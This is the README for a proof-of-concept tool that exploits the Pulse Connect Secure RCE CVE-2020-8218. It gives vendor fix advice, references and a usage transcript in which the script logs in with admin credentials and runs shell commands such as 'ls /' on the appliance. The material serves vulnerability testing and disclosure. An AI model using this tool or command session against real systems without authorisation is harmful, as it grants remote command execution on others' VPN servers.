# pulse-gosecure-rce

```
          _____                    _____                    _____            _____                    _____          
         /\    \                  /\    \                  /\    \          /\    \                  /\    \         
        /::\    \                /::\____\                /::\____\        /::\    \                /::\    \        
       /::::\    \              /:::/    /               /:::/    /       /::::\    \              /::::\    \       
      /::::::\    \            /:::/    /               /:::/    /       /::::::\    \            /::::::\    \      
     /:::/\:::\    \          /:::/    /               /:::/    /       /:::/\:::\    \          /:::/\:::\    \     
    /:::/__\:::\    \        /:::/    /               /:::/    /       /:::/__\:::\    \        /:::/__\:::\    \    
   /::::\   \:::\    \      /:::/    /               /:::/    /        \:::\   \:::\    \      /::::\   \:::\    \   
  /::::::\   \:::\    \    /:::/    /      _____    /:::/    /       ___\:::\   \:::\    \    /::::::\   \:::\    \  
 /:::/\:::\   \:::\____\  /:::/____/      /\    \  /:::/    /       /\   \:::\   \:::\    \  /:::/\:::\   \:::\    \ 
/:::/  \:::\   \:::|    ||:::|    /      /::\____\/:::/____/       /::\   \:::\   \:::\____\/:::/__\:::\   \:::\____\
\::/    \:::\  /:::|____||:::|____\     /:::/    /\:::\    \       \:::\   \:::\   \::/    /\:::\   \:::\   \::/    /
 \/_____/\:::\/:::/    /  \:::\    \   /:::/    /  \:::\    \       \:::\   \:::\   \/____/  \:::\   \:::\   \/____/ 
          \::::::/    /    \:::\    \ /:::/    /    \:::\    \       \:::\   \:::\    \       \:::\   \:::\    \     
           \::::/    /      \:::\    /:::/    /      \:::\    \       \:::\   \:::\____\       \:::\   \:::\____\    
            \::/____/        \:::\__/:::/    /        \:::\    \       \:::\  /:::/    /        \:::\   \::/    /    
             ~~               \::::::::/    /          \:::\    \       \:::\/:::/    /          \:::\   \/____/     
                               \::::::/    /            \:::\    \       \::::::/    /            \:::\    \         
                                \::::/    /              \:::\____\       \::::/    /              \:::\____\        
                                 \::/____/                \::/    /        \::/    /                \::/    /        
                                  ~~                       \/____/          \/____/                  \/____/         
  ```                                                                                                                   

## About
Proof of concept tool to test for the existence of Pulse Secure RCE (CVE-2020-8218) and to encourage further research. This tool was built around the POC from the GoSecure advisory. All credit to them for the finding. 

## Recommended Fix
As recommended by Pulse Secure:
***"The solution for these vulnerabilities is to upgrade the Pulse Connect Secure and Pulse Policy Secure server software version to the 9.1R8. This following PCS/PPS version can be downloaded from https://my.pulsesecure.net."***

## References
* https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44516/?kA23Z000000L6i5SAC
* https://www.gosecure.net/blog/2020/08/26/forget-your-perimeter-rce-in-pulse-connect-secure/

## Usage
```
Example usage:
withdk@hogwarts source % python pulse-gosecure-rce.py -u https://192.168.1.120 --user admin --password mypassword
[*] Successfully logged in
(Cmd) ls /
[*] Sending cmd ls /
[*] Sending exploit...
[*] Getting output...
******************************************
2.6.32.358-x86_64
bin
boot
cgroups
data
dev
etc
home
lib
lib64
modules
opt
pkg
proc
runtime
sbin
sys
tmp
usr
va
var
webserver

******************************************
(Cmd) exit
Bye
[*] Getting logout URL
[*] Sending logout URL
[*] Successfully logged out.
```

DK @withdk

## Disclaimer
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
